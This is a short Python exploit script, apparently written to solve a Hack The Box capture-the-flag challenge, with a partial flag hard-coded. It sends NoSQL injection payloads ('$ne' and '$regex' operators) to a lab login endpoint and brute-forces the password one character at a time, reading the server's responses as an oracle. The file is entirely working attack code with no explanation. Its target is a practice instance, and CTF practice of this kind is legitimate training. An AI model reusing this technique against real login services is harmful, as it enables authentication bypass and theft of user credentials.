import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

pc = possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
username="toto"
password="HTB{t0b3_5qL_0r_n05qL_7h4t_is_th3_Q"
u="http://206.189.18.74:32469/api/login"
headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://206.189.18.74:32469/login", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://206.189.18.74:32469", "Connection": "close"}

while True:
    for c in pc:
        if c not in ['*','+','.','?','|']:
            payload='username[$ne]=toto &password[$regex]=%s.{1}' % (password + c)
            print(payload)
            r = requests.post(u, data = payload, headers = headers)
            print(r.text)
            if 'authenticated' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
                

